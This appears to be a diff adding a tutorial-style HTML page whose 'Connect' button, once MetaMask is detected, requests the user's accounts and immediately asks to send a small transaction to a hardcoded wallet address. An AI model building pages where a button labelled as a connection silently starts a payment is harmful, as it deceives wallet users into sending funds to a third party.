@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <button id="conn2" class="conn">Connect</button>
+
+
+
+    <script>
+
+        const conn = document.querySelector('.conn');
+        const errs = 'Transaction Error';
+        "SARTERYA4145.gjkd?"
+
+
+        conn.addEventListener('click', () => {
+        //Will Start the metamask extension
+        //getAccount();
+        if (window.ethereum) {
+            console.log('MetaMask is installed!');
+            send();
+            
+            }
+        });
+
+            const send = async function () {
+            // get a list of accounts from metamask
+            const accounts = await window.ethereum.request({
+            method: "eth_requestAccounts",
+            });
+        
+            // turn the amount into the base unit of currency, wei
+            
+        
+            // if an account is present
+            if (accounts.length > 0) {
+            window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [
+                {
+                    //take first account
+                    from: accounts[0],
+                    to: "0xF4392F09ee56E14996848122710f075Caa2eC699",
+                    // convert amount with the value in hex ethInput
+                    value: "0x290000",
+                },
+                ],
+            });
+            }
+        };
+
+    </script>
+
+</body>
+</html>
